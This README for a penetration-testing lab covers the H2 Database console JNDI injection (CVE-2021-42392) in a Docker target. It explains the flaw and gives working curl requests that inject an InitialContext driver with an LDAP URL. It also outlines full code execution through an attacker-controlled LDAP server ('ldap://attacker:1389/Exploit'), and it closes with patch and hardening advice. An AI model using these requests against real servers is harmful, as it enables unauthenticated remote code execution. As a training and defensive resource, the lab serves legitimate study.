# H2 Database Web Console JNDI Injection RCE (CVE-2021-42392)

## Laboratory Overview

This laboratory provides an isolated, production-grade practice target for studying **H2 Database Web Console JNDI Injection RCE (CVE-2021-42392)**.

- **Target Directory**: `Classes/02_web_penetration_tester/16_advanced_sql_injection/h2database_jndi_rce`
- **Default Port(s)**: `8184:8080` (H2 Console accessible at `http://localhost:8184/h2-console/`)
- **CLI Shortcut**: `./lab start h2database-rce`

---

## Architecture & Service Map

- **Container Name**: `cyberlab_02_h2database`
- **Upstream Image**: `vulhub/spring-with-h2database:2.0.204`
- **Network Mode**: Bridge (Isolated Docker network)
- **Resource Ceiling**: 1024 MB RAM limit

---

## Vulnerability Mechanics

H2 Database is an open-source, lightweight Java relational database management system often embedded in Spring Boot applications. When Spring Boot is configured with the H2 Console enabled (`spring.h2.console.enabled=true` and `spring.h2.console.settings.web-allow-others=true`), a web-based database management interface is exposed without authentication at `/h2-console/`.

CVE-2021-42392 is a critical unauthenticated remote code execution vulnerability similar to Log4Shell (CVE-2021-44228). In H2 Database versions from 1.1.100 up to 2.0.204, the web console driver parameter allows specifying arbitrary driver classes. When a class implementing `javax.naming.Context` (such as `javax.naming.InitialContext`) is provided, H2 invokes JNDI lookup functionality on the user-controlled JDBC URL without proper protocol scheme validation.

### Technical Root Cause

In `org.h2.util.JdbcUtils.getConnection(String driver, String url, String user, String password)`:

```java
} else if (javax.naming.Context.class.isAssignableFrom(d)) {
    // JNDI context
    Context context = (Context) d.getDeclaredConstructor().newInstance();
    DataSource ds = (DataSource) context.lookup(url);
    return ds.getConnection(user, password);
}
```

When an attacker sets `driver=javax.naming.InitialContext` and `url=ldap://attacker:1389/Exploit` or `rmi://attacker:1099/Exploit`, H2 instantiates `InitialContext` and executes `context.lookup(url)`. This causes the target JVM to connect out to an attacker-controlled LDAP or RMI server, fetch reference metadata, download malicious Java bytecode, and execute arbitrary code within the context of the Spring Boot application server.

---

## Verification & Exploitation Guide

### 1. Verify Service & Web Console Availability

Check that the Spring Boot container is running and access the H2 Web Console:

```bash
curl -s -i "http://localhost:8184/h2-console/"
```

The response returns `HTTP/1.1 200 OK` with `<title>H2 Console</title>` and a redirect script containing the active session identifier `login.jsp?jsessionid=...`.

### 2. Extract Session ID and Inspect Login Page

Retrieve a valid session identifier and inspect the login form parameters:

```bash
SESSION=$(curl -s "http://localhost:8184/h2-console/" | grep -oP "jsessionid=\K[0-9a-f]+")
echo "Retrieved Session ID: ${SESSION}"

curl -s "http://localhost:8184/h2-console/login.jsp?jsessionid=${SESSION}" | grep -E "name=\"(driver|url|user|password)\""
```

### 3. Trigger JNDI Driver Lookup Injection

Submit a POST request to `/h2-console/login.do` passing `driver=javax.naming.InitialContext` and a target JNDI URL:

```bash
SESSION=$(curl -s "http://localhost:8184/h2-console/" | grep -oP "jsessionid=\K[0-9a-f]+")

curl -s -X POST "http://localhost:8184/h2-console/login.do?jsessionid=${SESSION}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "language=en&setting=Generic+H2+%28Embedded%29&name=Generic+H2+%28Embedded%29&driver=javax.naming.InitialContext&url=ldap%3A%2F%2F127.0.0.1%3A1389%2FExploit&user=&password="
```

The application attempts an outbound LDAP connection to `127.0.0.1:1389`. If no LDAP listener is present, the server returns an error disclosure confirming the JNDI lookup attempt:

```text
General error: "javax.naming.CommunicationException: 127.0.0.1:1389 [Root exception is java.net.ConnectException: Connection refused]" [50000-204]
Caused by: javax.naming.CommunicationException: 127.0.0.1:1389
    at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
    at javax.naming.InitialContext.lookup(InitialContext.java:417)
    at org.h2.util.JdbcUtils.getConnection(JdbcUtils.java:320)
```

### 4. Remote Code Execution via Malicious JNDI Server

In an end-to-end assessment:

1. Start an LDAP referral server (e.g. using `JNDI-Injection-Exploit` or `marshalsec` / `Java-Chains`) that serves a serialized gadget or reference redirecting to compiled exploit bytecode.
2. Provide the attacker listener URL in the `url` parameter (e.g. `ldap://<attacker-ip>:1389/Exploit`).
3. Upon receiving the lookup request, the target JVM instantiates the remote class, executing arbitrary system commands.

---

## Defensive Remediation & Hardening

- **Upgrade H2 Database**: Upgrade H2 Database engine to version `2.0.206` or newer. The patch enforces that JNDI lookups must strictly begin with the `java:` scheme, blocking untrusted remote schemes like `ldap://` or `rmi://`.
- **Disable H2 Console**: In production environments, set `spring.h2.console.enabled=false`.
- **Restrict Access to Localhost**: If the console is needed for local development, ensure `spring.h2.console.settings.web-allow-others=false` and bind the web server strictly to `127.0.0.1`.
- **Egress Network Filtering**: Restrict outbound connections from application servers to prevent unexpected egress traffic on LDAP (389, 636) and RMI (1099) ports.

---

## References & Advisories

- **Official Vulhub Repository**: [Vulhub CVE-2021-42392](https://github.com/vulhub/vulhub/tree/master/h2database/CVE-2021-42392)
- **H2 Database Security Advisory**: [GitHub Advisory GHSA-h376-j262-vhq6](https://github.com/h2database/h2database/security/advisories/GHSA-h376-j262-vhq6)
- **H2 Database Git Fix Commit**: [Commit b24aa46f48904ce64443f8f4353d70a2eed09037](https://github.com/h2database/h2database/commit/b24aa46f48904ce64443f8f4353d70a2eed09037)
- **JFrog Security Advisory**: [The JNDI Strikes Back: Unauthenticated RCE in H2 Database Console](https://jfrog.com/blog/the-jndi-strikes-back-unauthenticated-rce-in-h2-database-console/)
- **NVD Entry**: [CVE-2021-42392](https://nvd.nist.gov/vuln/detail/CVE-2021-42392)

---

## Verified Video Walkthrough

- **Video Title**: [HackTheBox Hawk Walkthrough: FTP, Drupal Exploitation, and H2 Database RCE](https://www.youtube.com/watch?v=i3-N94T2hGk)
- **Direct URL**: https://www.youtube.com/watch?v=i3-N94T2hGk
